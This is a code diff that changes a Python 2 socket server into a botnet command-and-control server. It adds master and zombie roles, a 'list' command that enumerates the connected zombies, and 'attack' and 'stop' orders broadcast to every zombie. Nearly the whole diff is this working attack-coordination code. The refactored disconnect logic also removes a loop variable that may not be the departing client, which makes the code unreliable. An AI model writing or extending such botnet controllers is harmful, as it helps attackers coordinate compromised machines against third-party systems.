@@ -41,23 +41,23 @@ class SocketServer(socket.socket):
             thread.start_new_thread(self.recieve, (clientsocket,))
 
     def recieve(self, client):
-        while 1:
-            data = client.recv(1024)
-            data2 = data.rstrip()
-            if data2 == "list":
-                list = self.listzombies()
-                client.send(list)
-            if data2 == "die":
-                break
-            #Message Received
-            self.onmessage(client, data)
-        #Removing client from clients list
+
+        # Lookup client role
         for i in self.clients:
             if i[0] == client:
-                rmrole = i[1]
-                self.clients.remove(i)
+                client_role = i[1]
+
+        alive = 1
+        # Iterate until die command
+        while alive:
+            data = client.recv(1024)
+            #Message Received
+            alive = self.onmessage(client, data, client_role)
+
+        #Removing client from clients list
+        self.clients.remove(i)
         #Client Disconnected
-        self.onclose(client,client.getpeername(),rmrole)
+        self.onclose(client,client.getpeername(),client_role)
         #Closing connection with client
         client.close()
         #Closing thread
@@ -82,7 +82,7 @@ class SocketServer(socket.socket):
     def onopen(self, client, address, role):
         pass
 
-    def onmessage(self, client, message):
+    def onmessage(self, client, message, role):
         pass
 
     def onclose(self, client, address, role):
@@ -95,10 +95,26 @@ class BasicChatServer(SocketServer):
     def __init__(self):
         SocketServer.__init__(self)
 
-    def onmessage(self, client, message):
-        print "Client Sent Message"
-        #Sending message to all clients but sender
-        self.broadcast(message)
+    def onmessage(self, client, message,role):
+        #print role.capitalize() + " Sent Message:",
+        data = message.rstrip()
+        #List of zombies connected
+        if data == "list":
+            print "Retrieving zombie list to Master"
+            list = self.listzombies()
+            client.send(list)
+        #Sending attack message to zombies
+        elif data == "attack":
+            print "Master sent attack order"
+            self.broadcast(message)
+            client.send("Attack mode activated\n")
+        #Sending stop message to zombies
+        elif data == "stop":
+            print "Master sent stop order"
+            self.broadcast(message)
+            client.send("Attack mode interrupted\n")
+
+        return data != "die"
 
     def onopen(self, client, address, role):
         print role.capitalize() + " Connected = " + str(address)
